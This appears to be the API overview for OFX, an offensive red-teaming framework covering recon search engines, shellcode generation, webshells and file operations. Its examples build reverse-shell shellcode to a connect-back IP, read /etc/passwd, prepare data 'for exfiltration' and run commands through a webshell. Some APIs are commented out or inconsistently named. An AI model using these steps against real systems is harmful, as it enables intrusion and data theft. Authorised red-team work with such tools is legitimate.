# API Overview

OFX provides comprehensive red teaming APIs to reduce scripting overhead by 80-90%.

## Quick Navigation

- **[Reconnaissance APIs](reconnaissance.md)** - Search engines, OOB testing, network scanning, HTTP server
- **[Exploitation APIs](exploitation.md)** - HTTP client, shellcode generation, webshells, binary exploitation  
- **[Post-Exploitation APIs](post-exploitation.md)** - File operations, utilities, data manipulation

## Categories

> **Note:** Some APIs listed in this overview may not be available in the core library and could be part of other packages within the OFX ecosystem. The examples below use APIs available in the provided source context.

### :material-radar: Reconnaissance

Search engines, port scanning, service grabbing, DNS resolution, and subdomain enumeration.

| API | Purpose | Example |
|-----|---------|---------|
| **Fofa** | Asset discovery via Fofa search | `fofa.search('app="Apache"')` |
| **Shodan** | Internet-wide scanning search | `shodan.search('apache')` |
| **ZoomEye** | Cyberspace search engine | `zoomeye.search('apache')` |
| **CEye** | OOB DNS/HTTP callback testing | `ceye.build_request('data')` |
| **Interactsh** | OOB interaction testing | `interactsh.register()` |
| **PHTTPServer** | Payload hosting with SSL | `server.start(daemon=True)` |
<!--
| **PortScanner** | Fast port discovery | `scanner.scan()` |
| **ServiceGrabber** | Banner grabbing | `grabber.grab_banner()` |
| **DNSResolver** | DNS record enumeration | `resolver.query('example.com')` |
| **SubdomainEnumerator** | Subdomain discovery | `enum.enumerate()` |
-->

### :material-bug: Exploitation

Binary analysis, payload building, process execution, and network utilities.

| API | Purpose | Example |
|-----|---------|---------|
| **ShellcodeGenerator** | Platform-specific shellcode | `gen.generate('linux', 'x64')` |
<!--
| **RemoteTarget** | Socket connections | `with RemoteTarget(host, port) as r:` |
| **BinaryAnalyzer** | Security property analysis | `analyzer.check_pie()` |
| **PayloadBuilder** | Shellcode generation | `builder.build_shellcode()` |
| **ProcessRunner** | Local execution | `runner.execute()` |
-->

### :material-key: Post-Exploitation

File operations, process management, cryptography, and credential handling.

| API | Purpose | Example |
|-----|---------|---------|
| **file** | File operations | `file.read_file(path)` |
<!--
| **ProcessUtils** | Command execution | `ProcessUtils.run_command(cmd)` |
| **CryptoUtils** | Hashing and encoding | `CryptoUtils.md5(data)` |
| **DataTransformer** | Format conversion | `transformer.to_json(data)` |
| **CredentialManager** | Secure credential storage | `manager.store(key, value)` |
-->

## Quick Start

### Reconnaissance Example

```python
from ofx.api import search

# Asset discovery
fofa = search.Fofa()
targets = fofa.search('app="Apache" && country="US"', pages=2)

# This example uses fofa, which is available.
# PortScanner is commented out as it is not in the provided context.
# for target in targets['results'][:10]:
#     scanner = PortScanner(target=target['ip'], ports='80,443,8080')
#     open_ports = scanner.scan()
#     print(f"{target['ip']}: {open_ports}")
```

### Exploitation Example

```python
from ofx.api import shellcode

# Build payload
sc_gen = shellcode.ShellGenerator('linux', 'x64')
payload, _ = sc_gen.get_shellcode(
    shellcode_type='reverse',
    connectback_ip='10.0.0.1',
    connectback_port=4444
)

# RemoteTarget is commented out as it is not in the provided context.
# # Send to target
# with RemoteTarget(host='target.com', port=9999) as remote:
#     remote.send(payload)
#     response = remote.recv()
```

### Post-Exploitation Example

```python
from ofx.api import file

# Read sensitive file
data = file.read_file('/etc/passwd')

# CryptoUtils is commented out as it is not in the provided context.
# # Hash for verification
# hash_value = CryptoUtils.sha256(data)
# 
# # Encode for exfiltration
# encoded = CryptoUtils.base64_encode(data)
```

## Next Steps

### Detailed API Documentation

Explore comprehensive guides with usage examples:

- **[Reconnaissance APIs](reconnaissance.md)**
  - FOFA, Shodan, ZoomEye search engines
  - CEye, Interactsh OOB testing
  - HTTP server for payload hosting
- **[Exploitation APIs](exploitation.md)**
  - HTTP client with connection pooling
  - Shellcode generation and encoding
  - WebShell factory and client
- **[Post-Exploitation APIs](post-exploitation.md)**
  - File read/write operations
  - String and data utilities
  - URL parsing and IP resolution
  - User agent generation

### CLI Documentation Browser

Use the built-in API documentation command to explore all available APIs:

```bash
# List all API modules
ofx docs api --list

# View detailed documentation for a specific module
ofx docs api --module webshell
ofx docs api --module http
ofx docs api --module file

# View specific function or class details
ofx docs api --module webshell --function WebShell
ofx docs api --module http --function fetch
```

### API Usage in Workflows

All APIs can be used directly in your workflow steps:

```yaml
name: api-example
description: Using OFX APIs in workflows

jobs:
  recon:
    steps:
      - name: Use HTTP API
        script: |
          from ofx.api import http
          
          response = http.fetch("https://api.target.com")
          print(response)
      
      - name: Use WebShell API
        script: |
          from ofx.api import webshell
          
          shell = webshell.WebShell(
              url="${{ inputs.shell_url }}",
              param="cmd"
          )
          result = shell.execute("whoami")
          print(result)
```

### Common API Patterns

**HTTP Requests:**
```python
from ofx.api import http

# GET request
response = http.fetch("https://api.example.com/data")

# POST request
data = http.post("https://api.example.com/submit", 
                 data={"key": "value"})
```

**File Operations:**
```python
from ofx.api import file

# Read file
content = file.read_file("results.txt")

# Write file
file.write_file("output.txt", "data")
```

**String Manipulation:**
```python
from ofx.api import strings

# This is an example, function does not exist in provided context
# # Encode/decode
# encoded = strings.base64_encode("data")
# decoded = strings.base64_decode(encoded)
# 
# # URL operations
# encoded_url = strings.url_encode("param=value&test=1")
```

For complete API reference with parameters, return types, and examples, use:
```bash
ofx docs api --module <module_name>
```
